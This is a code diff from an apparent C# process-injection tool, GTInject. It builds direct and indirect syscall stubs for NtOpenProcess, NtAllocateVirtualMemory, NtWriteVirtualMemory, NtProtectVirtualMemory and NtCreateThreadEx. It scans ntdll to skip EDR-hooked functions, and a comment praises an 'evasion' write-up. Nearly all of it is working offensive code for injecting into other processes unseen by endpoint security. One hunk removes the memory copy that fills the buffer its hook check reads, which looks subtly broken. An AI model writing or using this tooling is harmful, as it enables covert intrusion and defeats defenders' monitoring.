@@ -1,12 +1,10 @@
 ﻿using System;
 using System.Collections;
-using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading.Tasks;
 
 namespace GTInject.SysCalls
 {
@@ -15,9 +13,7 @@ namespace GTInject.SysCalls
 
         static IntPtr ntdllBaseAddress = IntPtr.Zero;
 
-        /// <summary>
         /// Gets the base address of ntdll.dll
-        /// </summary>
         public static IntPtr NtDllBaseAddress
         {
             get
@@ -29,14 +25,6 @@ namespace GTInject.SysCalls
         }
 
         static byte[] bDirectSysCallStub =
-{
-            0x4C, 0x8B, 0xD1,               // mov r10, rcx
-            0xB8, 0x26, 0x00, 0x00, 0x00,   // mov eax, 0x26 (NtOpenProcess Syscall)
-            0x0F, 0x05,                     // syscall
-            0xC3                            // ret
-        };
-
-        static byte[] bNtOpenProcess =
         {
             0x4C, 0x8B, 0xD1,               // mov r10, rcx
             0xB8, 0x26, 0x00, 0x00, 0x00,   // mov eax, 0x26 (NtOpenProcess Syscall)
@@ -44,44 +32,22 @@ namespace GTInject.SysCalls
             0xC3                            // ret
         };
 
-        static byte[] bNtAllocateVirtualMemory =
+        //https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp
+        // ^ GOLD
+
+        static byte[] bIndirectSysCallStub =
         {
-            0x4C, 0x8B, 0xD1,               // mov r10, rcx
-            0xB8, 0x18, 0x00, 0x00, 0x00,   // mov eax, 0x18 (NtAllocateVirtualMemory Syscall)
-            0x0F, 0x05,                     // syscall
-            0xC3                            // ret
+            0x4C, 0x8B, 0xD1,               			                // mov r10, rcx
+	        0xB8, 0x18, 0x00, 0x00, 0x00,    	              	        // mov eax, syscall number
+	        0x49, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // movabs r11,syscall address
+	        0x41, 0xFF, 0xE3 				       	                    // jmp r11
         };
 
-        static byte[] bNtWriteVirtualMemory =
-        {
-            0x4C, 0x8B, 0xD1,               // mov r10, rcx
-            0xB8, 0x3a, 0x00, 0x00, 0x00,   // mov eax, 0x3a (NtWriteVirtualMemory Syscall)
-            0x0F, 0x05,                     // syscall
-            0xC3                            // ret
-        };
-
-        static byte[] bNtCreateThreadEx =
-        {
-            0x4C, 0x8B, 0xD1,               // mov r10, rcx
-            0xB8, 0xc1, 0x00, 0x00, 0x00,   // mov eax, 0xc1 (NtCreateThreadEx Syscall)
-            0x0F, 0x05,                     // syscall
-            0xC3                            // ret
-        };
-
-        static byte[] bNtProtectVirtualMemory =
-        {
-            0x4C, 0x8B, 0xD1,               // mov r10, rcx
-            0xB8, 0x50, 0x00, 0x00, 0x00,   // mov eax, 0x50 (NtCreateThreadEx Syscall)
-            0x0F, 0x05,                     // syscall
-            0xC3                            // ret
-        };
-
-
-        // Review if the RWX here matters - could see about RW / RX changes if that would be better / possible, step through this. 
+        // Review if the RWX here matters - could see about RX changes if that would be better / possible, step through this. 
         public static WinNative.NTSTATUS SysclNtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref SysCalls.WinNative.OBJECT_ATTRIBUTES ObjectAttributes, ref SysCalls.WinNative.CLIENT_ID ClientId)
         {
             // dynamically resolve the syscall
-            byte[] syscall = bNtOpenProcess;
+            byte[] syscall = bDirectSysCallStub;
             syscall[4] = GetSysCallId("NtOpenProcess");
 
             unsafe
@@ -105,7 +71,7 @@ namespace GTInject.SysCalls
         public static SysCalls.WinNative.NTSTATUS SysclNtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionZize, UInt32 AllocationType, UInt32 Protect)
         {
             // dynamically resolve the syscall
-            byte[] syscall = bNtAllocateVirtualMemory;
+            byte[] syscall = bDirectSysCallStub;
             syscall[4] = GetSysCallId("NtAllocateVirtualMemory");
 
             unsafe
@@ -129,7 +95,7 @@ namespace GTInject.SysCalls
         public static SysCalls.WinNative.NTSTATUS SysclNtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress, IntPtr buffer, UInt32 Length, ref UInt32 bytesWritten)
         {
             // dynamically resolve the syscall
-            byte[] syscall = bNtWriteVirtualMemory;
+            byte[] syscall = bDirectSysCallStub;
             syscall[4] = GetSysCallId("NtWriteVirtualMemory");
 
 
@@ -154,7 +120,7 @@ namespace GTInject.SysCalls
         public static SysCalls.WinNative.NTSTATUS SysclNtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect)
         {
             // dynamically resolve the syscall
-            byte[] syscall = bNtProtectVirtualMemory;
+            byte[] syscall = bDirectSysCallStub;
             syscall[4] = GetSysCallId("NtProtectVirtualMemory");
 
             unsafe
@@ -178,8 +144,47 @@ namespace GTInject.SysCalls
         public static SysCalls.WinNative.NTSTATUS SysclNtCreateThreadEx(out IntPtr threadHandle, WinNative.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
         {
             // dynamically resolve the syscall
-            byte[] syscall = bNtCreateThreadEx;
+            byte[] syscall = bDirectSysCallStub;
             syscall[4] = GetSysCallId("NtCreateThreadEx");
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtCreateThreadEx assembledFunction = (Delegates.DelgNtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtCreateThreadEx));
+
+                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(out threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList);
+                }
+            }
+        }
+
+
+        public static SysCalls.WinNative.NTSTATUS IndirectSysclNtCreateThreadEx(out IntPtr threadHandle, WinNative.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
+        {
+            Console.WriteLine("attach debugger");
+            Console.ReadLine();
+            // dynamically resolve the syscall
+            byte[] syscall = bIndirectSysCallStub;
+            IntPtr syscallMemAddr;
+            (syscall[4],syscallMemAddr) = GetIndirectSysCall("NtCreateThreadEx");
+            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
+            Console.WriteLine(syscallmemstring);
+            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
+            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
+            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
+            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
+            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
+            Console.WriteLine(ByteArrayToString(syscallInstruction));
+            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
+            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
+            Console.WriteLine(ByteArrayToString(syscall));
 
             unsafe
             {
@@ -277,8 +282,8 @@ namespace GTInject.SysCalls
                 bool hooked = false;
 
                 var instructions = new byte[5];
-                Marshal.Copy(funcAddress, instructions, 0, 5);
-                if (!StructuralComparisons.StructuralEqualityComparer.Equals(new byte[3] { instructions[0], instructions[1], instructions[2] }, new byte[3] { 0x4C, 0x8B, 0xD1 }))
+                // Edited to the 4th byte - found some EDRs jmp after the initial mov r10, rcx, should consider that hooked
+                if (!StructuralComparisons.StructuralEqualityComparer.Equals(new byte[4] { instructions[0], instructions[1], instructions[2], instructions[3] }, new byte[4] { 0x4C, 0x8B, 0xD1, 0xB8 }))
                 {
                     hooked = true;
                 }
@@ -294,6 +299,61 @@ namespace GTInject.SysCalls
             }
         }
 
+
+        public static (byte, IntPtr) GetIndirectSysCall(string FunctionName)
+        {
+            byte[] syscall_code = { 0x0f, 0x05, 0xc3 };
+            UInt32 distance_to_syscall = 0x12;
+
+
+            // first get the proc address
+            IntPtr funcAddress = WinNative.GetProcAddress(NtDllBaseAddress, FunctionName);
+
+            byte count = 0;
+
+            // loop until we find an unhooked function
+            while (true)
+            {
+                // is the function hooked - we are looking for the 0x4C, 0x8B, 0xD1, instructions - this is the start of a syscall
+                bool hooked = false;
+
+                var instructions = new byte[5];
+                Marshal.Copy(funcAddress, instructions, 0, 5);
+                // Edited to the 4th byte - found some EDRs jmp after the initial mov r10, rcx, should consider that hooked
+                if (!StructuralComparisons.StructuralEqualityComparer.Equals(new byte[4] { instructions[0], instructions[1], instructions[2], instructions[3] }, new byte[4] { 0x4C, 0x8B, 0xD1, 0xB8 }))
+                {
+                    hooked = true;
+                }
+
+                if (!hooked)
+                {
+                    byte sysId = (byte)(instructions[4] - count);
+                    Console.WriteLine("     Syscall ID dynamically resolved {1} to {0:X2}", sysId, FunctionName);
+                    IntPtr syscallInstruction = (IntPtr)((UInt64)funcAddress + (UInt64)distance_to_syscall);
+                    Console.WriteLine("Syscall instruction address " + syscallInstruction);
+                    return (sysId, syscallInstruction);
+                }
+
+                funcAddress = (IntPtr)((UInt64)funcAddress + ((UInt64)32));
+                count++;
+            }
+        }
+
+        public static string ByteArrayToString(byte[] ba)
+        {
+            StringBuilder hex = new StringBuilder(ba.Length * 2);
+            foreach (byte b in ba)
+                hex.AppendFormat("{0:x2}", b);
+            return hex.ToString();
+        }
+        public static byte[] StringToByteArray(String hex)
+        {
+            int NumberChars = hex.Length;
+            byte[] bytes = new byte[NumberChars / 2];
+            for (int i = 0; i < NumberChars; i += 2)
+                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+            return bytes;
+        }
         struct Delegates
         {
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
